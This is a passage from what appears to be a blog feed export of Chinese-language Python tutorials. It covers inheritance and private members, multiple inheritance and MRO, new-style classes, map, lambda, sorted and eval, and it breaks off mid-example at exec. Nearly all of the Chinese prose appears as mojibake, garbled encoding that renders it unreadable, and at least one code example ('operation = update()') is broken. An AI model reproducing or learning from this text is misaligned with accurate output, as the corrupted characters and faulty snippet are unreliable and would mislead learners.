type="1"><li><p><strong>å­ç±»å¯¹è±¡</strong>ä¸èƒ½åœ¨è‡ªå·±çš„æ–¹æ³•å†…éƒ¨ï¼Œ<strong>ç›´æ¥</strong>è®¿é—®çˆ¶ç±»çš„<strong>ç§æœ‰å±æ€§æˆ–ç§æœ‰æ–¹æ³•</strong></p></li><li><p><strong>å­ç±»å¯¹è±¡</strong>å¯ä»¥é€šè¿‡<strong>çˆ¶ç±»</strong>çš„<strong>å…¬æœ‰æ–¹æ³•**</strong>é—´æ¥<strong>è®¿é—®åˆ°</strong>ç§æœ‰å±æ€§<strong>æˆ–</strong>ç§æœ‰æ–¹æ³•**</p></li></ol><blockquote><ul><li><strong>ç§æœ‰å±æ€§ã€æ–¹æ³•</strong>æ˜¯å¯¹è±¡çš„éšç§ï¼Œä¸å¯¹å¤–å…¬å¼€ï¼Œ<strong>å¤–ç•Œä»¥åŠå­ç±»</strong>éƒ½ä¸èƒ½ç›´æ¥è®¿é—®</li><li><strong>ç§æœ‰å±æ€§ã€æ–¹æ³•</strong>é€šå¸¸ç”¨äºåšä¸€äº›å†…éƒ¨çš„äº‹æƒ…</li></ul></blockquote><h1 id="å¤šç»§æ‰¿">å¤šç»§æ‰¿</h1><ul><li><p><strong>å­ç±»</strong>å¯ä»¥æ‹¥æœ‰<strong>å¤šä¸ªçˆ¶ç±»</strong>ï¼Œå¹¶ä¸”å…·æœ‰<strong>æ‰€æœ‰çˆ¶ç±»</strong>çš„<strong>å±æ€§</strong>å’Œ<strong>æ–¹æ³•</strong></p></li><li><p>ä¾‹å¦‚ï¼š<strong>å­©å­</strong>ä¼šç»§æ‰¿è‡ªå·±<strong>çˆ¶äº²</strong>å’Œ<strong>æ¯äº²</strong>çš„<strong>ç‰¹æ€§</strong></p></li></ul><p>å¤šç»§æ‰¿å¯ä»¥è®©å­ç±»å¯¹è±¡ï¼ŒåŒæ—¶å…·æœ‰å¤šä¸ªçˆ¶ç±»çš„å±æ€§å’Œæ–¹æ³•.</p><h2 id="é—®é¢˜çš„æå‡º">é—®é¢˜çš„æå‡º</h2><ul><li>å¦‚æœ<strong>ä¸åŒçš„çˆ¶ç±»</strong>ä¸­å­˜åœ¨<strong>åŒåçš„æ–¹æ³•</strong>ï¼Œ<strong>å­ç±»å¯¹è±¡</strong>åœ¨è°ƒç”¨æ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨<strong>å“ªä¸€ä¸ªçˆ¶ç±»</strong>ä¸­çš„æ–¹æ³•å‘¢ï¼Ÿ</li></ul><blockquote><p>æç¤ºï¼š<strong>å¼€å‘æ—¶ï¼Œåº”è¯¥å°½é‡é¿å…è¿™ç§å®¹æ˜“äº§ç”Ÿæ··æ¸…çš„æƒ…å†µ</strong>ï¼ãƒ¼ãƒ¼å¦‚æœ<strong>çˆ¶ç±»ä¹‹é—´</strong>å­˜åœ¨<strong>åŒåçš„å±æ€§æˆ–å®³æ–¹æ³•</strong>ï¼Œåº”è¯¥<strong>å°½é‡é¿å…</strong>ä½¿ç”¨å¤šç»§æ‰¿</p></blockquote><h2 id="python-ä¸­çš„-mro-ãƒ¼ãƒ¼æ–¹æ³•æœç´¢é¡ºåºçŸ¥é“">Python ä¸­çš„ MROãƒ¼ãƒ¼æ–¹æ³•æœç´¢é¡ºåºï¼ˆçŸ¥é“ï¼‰</h2><p>Pythonä¸­é’ˆå¯¹<strong>ç±»</strong>æä¾›äº†ä¸€ä¸ª<strong>å†…ç½®å±æ€§</strong><code>__mro__</code>å¯ä»¥æŸ¥çœ‹æ–¹æ³•æœç´¢é¡ºåº</p><p><code>MRO</code> æ˜¯<code>method resolution order</code>ï¼Œä¸»è¦ç”¨äºåœ¨<strong>å¤šç»§æ‰¿æ—¶åˆ¤æ–­æ–¹æ³•ã€å±æ€§çš„è°ƒç”¨è·¯å¾„</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(C.__mro__)</span><br></pre></td></tr></table></figure><p>è¾“å…¥ç»“æœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.C&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.A&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.B&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure><ul><li>åœ¨æœç´¢æ–¹æ³•æ—¶ï¼Œæ˜¯æŒ‰ç…§ mroçš„è¾“å‡ºç»“æœ<strong>ä»å·¦è‡³å³</strong>çš„é¡¾åºæŸ¥æ‰¾çš„</li><li>å¦‚æœåœ¨å½“å‰ç±»ä¸­<strong>æ‰¾åˆ°æ–¹æ³•ï¼Œå°±ç›´æ¥æ‰§è¡Œï¼Œä¸å†æœç´ </strong></li><li>å¦‚æœ<strong>æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±æŸ¥æ‰¾ä¸‹ãƒ¼ä¸ªç±»</strong>ä¸­æ˜¯å¦æœ‰å¯¹åº”çš„æ–¹æ³•ï¼Œ<strong>å¦‚æœæ‰¾åˆ°ï¼Œå°±ç›´æ¥æ‰§è¡Œï¼Œä¸å†æœç´¢</strong></li><li>å¦‚æœæ‰¾åˆ°æœ€åä¸€ä¸ªç±»ï¼Œè¿˜æ²¡æœ‰æ‰¾åˆ°æ–¹æ³•ï¼Œç¨‹åºæŠ¥é”™</li></ul><h2 id="æ–°å¼ç±»ä¸æ—§å¼ç»å…¸ç±»">æ–°å¼ç±»ä¸æ—§å¼ï¼ˆç»å…¸ï¼‰ç±»</h2><blockquote><p><code>objec</code> æ˜¯ <code>Python</code>ä¸ºæ‰€æœ‰å¯¹è±¡æä¾›çš„<strong>åŸºç±»</strong>ï¼Œæä¾›æœ‰ä¸€äº›å†…ç½®çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨<code>dir</code>å‡½æ•°æŸ¥çœ‹</p></blockquote><ul><li><p>æ–°å¼ç±»ï¼šä»¥ <code>object</code>ä¸ºåŸºç±»çš„ç±»ï¼Œæ¨èä½¿ç”¨</p></li><li><p>ç»å…¸ç±»ï¼šä¸ä»¥ <code>object</code>ä¸ºåŸºç±»çš„ç±»ï¼Œä¸æ¨èä½¿ç”¨</p></li><li><p>åœ¨ <code>Python3, x</code>ä¸­å®šä¹‰ç±»æ—¶ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šçˆ¶ç±»ï¼Œä¼š<strong>é»˜è®¤ä½¿ç”¨</strong><code>object</code> ä½œä¸ºè¯¥ç±»çš„<strong>åŸºç±»</strong>.</p><p>Python3, x ä¸­å®šä¹‰çš„ç±»éƒ½æ˜¯æ–°å¼ç±»</p></li><li><p>åœ¨ <code>Python2.x</code> ä¸­å®šä¹‰ç±»æ—¶ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šçˆ¶ç±»ï¼Œåˆ™ä¸ä¼šä»¥<code>object</code>ä½œä¸ºåŸºç±»</p></li></ul><blockquote><p><strong>æ–°å¼ç±»</strong>å’Œ<strong>ç»å…¸ç±»</strong>åœ¨å¤šç»§æ‰¿æ—¶ä¸€ä¸€<strong>ä¼šå½±å“åˆ°æ–¹æ³•çš„æœç´¢é¡ºåº</strong></p></blockquote><p>ä¸ºäº†ä¿è¯ç¼–å†™çš„ä»£ç èƒ½å¤ŸåŒæ—¶åœ¨ Python2. X å’Œ Python3, Xè¿è¡Œï¼<strong>ä»Šååœ¨å®šä¹‰ç±»æ—¶ï¼Œå¦‚æœæ²¡æœ‰çˆ¶ç±»ï¼Œå»ºè®®ç»Ÿä¸€ç»§æ‰¿è‡ª<code>object</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ç±»å</span>ï¼ˆ<span class="built_in">object</span>)</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python common functions</title>
      <link href="/blog/2020/03/22/programming/python/1.basic/8.com_funcs/"/>
      <url>/blog/2020/03/22/programming/python/1.basic/8.com_funcs/</url>
      
        <content type="html"><![CDATA[<h2 id="map">map</h2><p>map()ä¼šæ ¹æ®<strong>æä¾›çš„å‡½æ•°</strong>å¯¹æŒ‡å®š<strong>å¯è¿­ä»£åºåˆ—</strong>åšæ˜ å°„ã€‚</p><p><code>map(function, iterable, ...)</code></p><ul><li>function -- å‡½æ•°</li><li>iterable -- ä¸€ä¸ªæˆ–å¤šä¸ªåºåˆ—</li></ul><p>ç¬¬ä¸€ä¸ªå‚æ•° function ä»¥å‚æ•°åºåˆ—ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ è°ƒç”¨ functionå‡½æ•°ï¼Œè¿”å›åŒ…å«æ¯æ¬¡ function å‡½æ•°è¿”å›å€¼çš„æ–°åˆ—è¡¨ã€‚</p><h3 id="è¿”å›å€¼">è¿”å›å€¼</h3><ul><li>Python 2.x è¿”å›åˆ—è¡¨ã€‚</li><li>Python 3.x è¿”å›è¿­ä»£å™¨ã€‚å¯ä»¥é€šè¿‡ <code>list()</code>è½¬æ¢ä¸º list</li></ul><blockquote><p>python map() is an iterator, so that we can iterate over elements.it's return value can be converted to tuple ,lists map is also veryusefull to use lambda functinons and it applies function to all items inthe input list</p></blockquote><p><code>map(function, iterable, ...)</code> the argument<em>iterable</em> can be any object capable of returning its members oneat a time not just lists. For example,<code>map(lambda x:x*x, range(10))</code> yields an iterable of thefirst ten perfect squares.</p><h2 id="lambda">lambda</h2><p>A lambda function is a small anonymous function.</p><p>A lambda function can take any number of arguments, but can only haveone expression.</p><p>è¯­æ³•ï¼š<code>lambda arguments : expression</code></p><p>The expression is executed and the result is returned:</p><ol type="1"><li><p>é€šå¸¸æ˜¯åœ¨éœ€è¦ä¸€ä¸ªä¸å¤ªå¤æ‚çš„å‡½æ•°ï¼Œä½†æ˜¯åˆä¸æƒ³è´¹ç¥å»å‘½åä¸€ä¸ªå‡½æ•°çš„åœºåˆä¸‹ä½¿ç”¨ã€‚</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">increcement</span>(<span class="params">x</span>):</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">increcement(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></p><p>å’Œ</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> x: x + <span class="number">1</span>)(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></p><p>ä¸¤ä¸ªåŠŸèƒ½æ˜¯ä¸€è‡´çš„ã€‚ä½†æ˜¯æ˜æ˜¾å¯ä»¥çœ‹å‡ºå¯¹äºä¸€äº›ç®€å•çš„åŠŸèƒ½æ¥è¯´ï¼Œå†™æˆ lamdbaåŒ¿åå‡½æ•°æ›´å…·å¤‡å¯è¯»æ€§ã€‚</p></li><li><p>lambda å‡½æ•°ä¹Ÿæ˜¯è¡¨è¾¾å¼ï¼Œä¹Ÿå¯ä»¥å‘½å</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">4</span>]: addone = <span class="keyword">lambda</span> x: x+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: addone(<span class="number">3</span>)</span><br><span class="line">Out[<span class="number">5</span>]: <span class="number">4</span></span><br></pre></td></tr></table></figure></p></li><li><p>å¤šä¸ªå‚æ•° é€—å·åˆ†å‰²ï¼Œä¸ç”¨æ‹¬å·åŒ…å›´<code>lambda x, y: x+y</code></p></li><li><p>å‡½æ•°å‚æ•°ï¼ˆé«˜é˜¶å‡½æ•°ï¼‰ A lambda function can be a higher-orderfunction by taking a function (normal or lambda) as an argument</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">high_ord_func = <span class="keyword">lambda</span> x, func: x + func(x)</span><br><span class="line">high_ord_func(<span class="number">2</span>, <span class="keyword">lambda</span> x: x * x)</span><br><span class="line"></span><br><span class="line">high_ord_func(<span class="number">2</span>, <span class="keyword">lambda</span> x: x + <span class="number">3</span>)</span><br></pre></td></tr></table></figure></p><p>Python exposes higher-order functions as built-in functions or in thestandard library. Examples include map(), filter(), functools.reduce(),as well as key functions like sort(), sorted(), min(), and max(). Youâ€™lluse lambda functions together with Python higher-orderfunctions</p></li></ol><h3 id="ä½¿ç”¨">ä½¿ç”¨</h3><p>ä¸€èˆ¬åœ¨ sorted, maxã€map ç­‰å‡½æ•°é‡Œçš„ key å¸¸ç”¨ lambda.æ¯”å¦‚æœ‰ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„æ•°ç»„ç»“æ„ï¼Œs = [('a', 3), ('b', 2), ('c',1)]å¯¹è¿™ä¸ªæ•°ç»„ç”¨ç¬¬äºŒä¸ªå…ƒç´ æ’åºã€‚å¯ä»¥å†™æˆ sorted(s, key=lambda x:x[1])</p><p>å…ˆä¸¾ä¸€ä¸ªæ™®é€šçš„ Python ä¾‹å­ï¼šå°†ä¸€ä¸ª list é‡Œçš„æ¯ä¸ªå…ƒç´ éƒ½å¹³æ–¹ï¼š<code>map(lambda x: x*x, [y for y in range(10)])</code></p><p>è¿™ä¸ªå†™æ³•è¦å¥½è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sq</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x * x</span><br><span class="line"><span class="built_in">map</span>(sq, [y <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)])</span><br></pre></td></tr></table></figure><p>å› ä¸ºåè€…å¤šå®šä¹‰äº†ä¸€ä¸ªï¼ˆæ±¡æŸ“ç¯å¢ƒçš„ï¼‰å‡½æ•°ï¼Œå°¤å…¶å¦‚æœè¿™ä¸ªå‡½æ•°åªä¼šä½¿ç”¨ä¸€æ¬¡çš„è¯ã€‚è€Œä¸”ç¬¬ä¸€ç§å†™æ³•å®é™…ä¸Šæ›´æ˜“è¯»ï¼Œå› ä¸ºé‚£ä¸ªæ˜ å°„åˆ°åˆ—è¡¨ä¸Šçš„å‡½æ•°å…·ä½“æ˜¯è¦åšä»€ä¹ˆï¼Œéå¸¸ä¸€ç›®äº†ç„¶ã€‚å¦‚æœä½ ä»”ç»†è§‚å¯Ÿè‡ªå·±çš„ä»£ç ï¼Œä¼šå‘ç°è¿™ç§åœºæ™¯å…¶å®å¾ˆå¸¸è§ï¼šä½ åœ¨æŸå¤„å°±çœŸçš„åªéœ€è¦ä¸€ä¸ªèƒ½åšä¸€ä»¶äº‹æƒ…çš„å‡½æ•°è€Œå·²ï¼Œè¿å®ƒå«ä»€ä¹ˆåå­—éƒ½æ— å…³ç´§è¦ã€‚Lambdaè¡¨è¾¾å¼å°±å¯ä»¥ç”¨æ¥åšè¿™ä»¶äº‹ã€‚</p><p>è¿›ä¸€æ­¥è®²ï¼ŒåŒ¿åå‡½æ•°æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒæ‰€æŠ½è±¡å‡ºæ¥çš„ä¸œè¥¿æ˜¯ä¸€ç»„è¿ç®—ã€‚è¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿç±»æ¯”<code>a = [1, 2, 3]</code>å’Œ <code>f = lambda x : x + 1</code></p><p>æ¯å½“ä½ éœ€è¦è¿™æ ·å†™æ—¶ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">r = []</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> a:</span><br><span class="line">    r.append(each+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>ä½ ä¼šå‘ç°è‡ªå·±å¦‚æœèƒ½å°†ã€Œéå†åˆ—è¡¨ï¼Œç»™é‡åˆ°çš„æ¯ä¸ªå…ƒç´ éƒ½åšæŸç§<strong>è¿ç®—</strong>ã€çš„è¿‡ç¨‹ä»ä¸€ä¸ªå¾ªç¯é‡ŒæŠ½è±¡å‡ºæ¥æˆä¸ºä¸€ä¸ªå‡½æ•°mapï¼Œç„¶åç”¨ lambda è¡¨è¾¾å¼å°†è¿™ç§<strong>è¿ç®—</strong>ä½œä¸ºå‚æ•°ä¼ ç»™ mapçš„è¯ï¼ŒPython ä¹‹ä¸­ï¼Œç±»ä¼¼èƒ½ç”¨åˆ° lambda è¡¨è¾¾å¼çš„ã€Œé«˜çº§ã€å‡½æ•°è¿˜æœ‰reduceã€filterç­‰ç­‰ã€‚è¿™ç§èƒ½å¤Ÿæ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°çš„å‡½æ•°å«åšã€Œé«˜é˜¶å‡½æ•°ã€ï¼ˆhigher-orderfunctionï¼‰ï¼Œæ˜¯æ¥è‡ªå‡½æ•°å¼ç¼–ç¨‹ï¼ˆfunctional programmingï¼‰çš„æ€æƒ³ã€‚</p><p>å’Œå…¶ä»–å¾ˆå¤šè¯­è¨€ç›¸æ¯”ï¼ŒPython çš„ lambdaé™åˆ¶å¤šå¤šï¼Œæœ€ä¸¥é‡çš„å½“å±å®ƒåªèƒ½ç”±ä¸€æ¡è¡¨è¾¾å¼ç»„æˆã€‚è¿™ä¸ªé™åˆ¶ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢æ»¥ç”¨ï¼Œå› ä¸ºå½“äººä»¬å‘è§‰lambdaå¾ˆæ–¹ä¾¿ï¼Œå°±æ¯”è¾ƒå®¹æ˜“æ»¥ç”¨ï¼Œå¯æ˜¯ç”¨å¤šäº†ä¼šè®©ç¨‹åºçœ‹èµ·æ¥ä¸é‚£ä¹ˆæ¸…æ™°ï¼Œæ¯•ç«Ÿæ¯ä¸ªäººå¯¹äºæŠ½è±¡å±‚çº§çš„å¿è€/ ç†è§£ç¨‹åº¦éƒ½æœ‰æ‰€ä¸åŒã€‚</p><h3 id="æ„ä¹‰">æ„ä¹‰</h3><ol type="1"><li>å¯ä»¥åœ¨è¡¨è¾¾å¼å½“ä¸­ç›´æ¥å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œè€Œä¸éœ€è¦å°†å®šä¹‰å‡½æ•°å’Œè¡¨è¾¾å¼åˆ†å¼€ï¼Œè¿™æ ·æœ‰åŠ©äºå°†é€»è¾‘ç”¨æ›´ç´§å‡‘çš„æ–¹å¼è¡¨è¾¾å‡ºæ¥ã€‚å®ƒçš„</li><li>å¼•å…¥äº†é—­åŒ…ã€‚åŸºæœ¬ä¸Šæ¥è¯´å¸¸è§çš„æ”¯æŒ lambdaè¡¨è¾¾å¼çš„è¯­è¨€é‡Œï¼Œä¸å­˜åœ¨ä¸æ”¯æŒé—­åŒ…çš„ lambda è¡¨è¾¾å¼ï¼›ä»å‡½æ•°å¼ç¼–ç¨‹çš„è§’åº¦æ¥è¯´ï¼Œæ”¯æŒé—­åŒ…ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ã€‚é—­åŒ…æ˜¯æŒ‡å°†å½“å‰ä½œç”¨åŸŸä¸­çš„å˜é‡é€šè¿‡å€¼æˆ–è€…å¼•ç”¨çš„æ–¹å¼å°è£…åˆ°lambda è¡¨è¾¾å¼å½“ä¸­ï¼Œæˆä¸ºè¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒä½¿ä½ çš„ lambdaè¡¨è¾¾å¼ä»ä¸€ä¸ªæ™®é€šçš„å‡½æ•°å˜æˆäº†ä¸€ä¸ªå¸¦éšè—å‚æ•°çš„å‡½æ•°ã€‚</li><li>ç¬¬ä¸‰ä¸ªæ„ä¹‰ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰æ˜¯å…è®¸å‡½æ•°ä½œä¸ºä¸€ä¸ªå¯¹è±¡æ¥è¿›è¡Œä¼ é€’ã€‚æŸäº›è¯­è¨€ç”±äºå†å²åŸå› ï¼Œåªæœ‰åŒ¿åå‡½æ•°å¯ä»¥ä½œä¸ºå¯¹è±¡ä¼ é€’ï¼Œè€Œå…·åå‡½æ•°ä¸å¯ä»¥ï¼Œæ¯”å¦‚PHPã€‚</li></ol><p>Python é‡ŒåµŒå¥—å®šä¹‰çš„élambdaã€æœ‰åçš„å‡½æ•°ä¸€æ ·å¼•å…¥äº†é—­åŒ…ä»¥åŠå¯ä»¥ä»»æ„ä¼ é€’ï¼Œæ‰€ä»¥.å¯¹ Pythonæ¥è¯´æ„ä¹‰åªæœ‰ç¬¬ä¸€æ¡ï¼Œå…¶å®çœåå­—å’Œå†™åˆ°ä¸€è¡Œæ˜¯æ¬¡è¦çš„ï¼Œé‡ç‚¹åœ¨äºåµŒå…¥åˆ°è¡¨è¾¾å¼é‡Œé¢</p><h2 id="sorted-å‡½æ•°">sorted å‡½æ•°</h2><p>sorted(iterable, key=None, reverse=False)</p><p>iterable: å¯è¿­ä»£å˜é‡ key: å‡½æ•°åï¼Œå¯ä»¥æ˜¯å†…ç½®å‡½æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯è‡ªå·±å†™çš„reverseï¼š é»˜è®¤ä¸º Falseï¼Œå‡åºï¼Œå¦‚æœæƒ³è¦é€†åºå°†å…¶è®¾ç½®ä¸º Trueã€‚</p><p>è¿”å›æ’åºåçš„åˆ—è¡¨ï¼ŒåŸå¯è¿­ä»£å¯¹è±¡ä¸å˜ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">take_second</span>(<span class="params">elem</span>):</span><br><span class="line">    <span class="keyword">return</span> elem[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># random list</span></span><br><span class="line">random = [(<span class="number">2</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sort list with key</span></span><br><span class="line">sorted_list = <span class="built_in">sorted</span>(random, key=take_second)</span><br></pre></td></tr></table></figure><h2 id="sort">sort</h2><p>First, sort is a method of the list class and can only be used withlists. It is not a built-in with an iterable passed to it.</p><p>Second, .sort() returns None and modifies the values <strong>inplace</strong>(ç›´æ¥å¯¹åŸåˆ—è¡¨è¿›è¡Œä¿®æ”¹). Letâ€™s take a look at the impactsof both of these differences in code:</p><h2 id="eval-å‡½æ•°">eval å‡½æ•°</h2><p><code>eval(expression[, globals[, locals]])</code></p><h3 id="å‚æ•°">å‚æ•°</h3><ul><li>expression -- è¡¨è¾¾å¼ã€‚</li><li>globals --å˜é‡ä½œç”¨åŸŸï¼Œå…¨å±€å‘½åç©ºé—´ï¼Œå¦‚æœè¢«æä¾›ï¼Œåˆ™å¿…é¡»æ˜¯ä¸€ä¸ªå­—å…¸å¯¹è±¡ã€‚</li><li>locals --å˜é‡ä½œç”¨åŸŸï¼Œå±€éƒ¨å‘½åç©ºé—´ï¼Œå¦‚æœè¢«æä¾›ï¼Œå¯ä»¥æ˜¯ä»»ä½•æ˜ å°„å¯¹è±¡ã€‚</li></ul><h3 id="è¿”å›å€¼-1">è¿”å›å€¼</h3><p>è¿”å›è¡¨è¾¾å¼è®¡ç®—ç»“æœã€‚</p><p>eval()å‡½æ•°ååˆ†å¼ºå¤§ãƒ¼ãƒ¼å°†å­—ç¬¦ä¸²å½“æˆæœ‰æ•ˆçš„è¡¨è¾¾å¼æ¥æ±‚å€¼å¹¶è¿”å›è®¡ç®—ç»“æœ</p><p>The <strong>eval()</strong> method parses the expression passed to itand runs python expression(code) within the program.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åŸºæœ¬çš„æ•°å­¦è®¡ç®—</span></span><br><span class="line">In [<span class="number">2</span>]:  <span class="built_in">eval</span>(<span class="string">&#x27;1+2*2&#x27;</span>)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="number">5</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># å­—ç¬¦ä¸²é‡å¤</span></span><br><span class="line">In [<span class="number">8</span>]: <span class="built_in">eval</span>(<span class="string">&quot;&#x27;*&#x27;*20&quot;</span>)</span><br><span class="line">Out[<span class="number">8</span>]: <span class="string">&#x27;********************&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—ç¬¦ä¸²è½¬æ¢ä¸ºåˆ—è¡¨</span></span><br><span class="line">In [<span class="number">3</span>]: li = <span class="built_in">eval</span>(<span class="string">&#x27;[1,2,3,4,5,9]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: li</span><br><span class="line">Out[<span class="number">4</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—å…¸</span></span><br><span class="line">In [<span class="number">6</span>]: dic = <span class="built_in">eval</span>(<span class="string">&quot;&#123;&#x27;name&#x27;:&#x27;xiaoming&#x27;, &#x27;age&#x27;:10&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: dic</span><br><span class="line">Out[<span class="number">7</span>]: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;xiaoming&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">10</span>&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ä½¿ç”¨ eval æ—¶ï¼Œå­—ç¬¦ä¸²å˜é‡çš„å‡½æ•°åéœ€è¦ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²,è€Œç›´æ¥å†™å˜é‡æˆ–è€…å‡½æ•°åæ˜¯å¯ä»¥çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">content = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">operation = update()</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">f&quot;a.<span class="subst">&#123;operation&#125;</span>(content)&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—å…¸">å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—å…¸</h3><ol type="1"><li><p><code>eval</code> å‡½æ•°</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: user = <span class="string">&quot;&#123;&#x27;name&#x27; : &#x27;jim&#x27;, &#x27;sex&#x27; : &#x27;male&#x27;, &#x27;age&#x27;: 18&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="built_in">eval</span>(user)</span><br><span class="line">Out[<span class="number">2</span>]: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;jim&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;male&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="built_in">type</span>(<span class="built_in">eval</span>(user))</span><br><span class="line">Out[<span class="number">3</span>]: <span class="built_in">dict</span></span><br></pre></td></tr></table></figure></p></li><li><p><code>exec</code> å‡½æ•°</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">4</span>]: <span 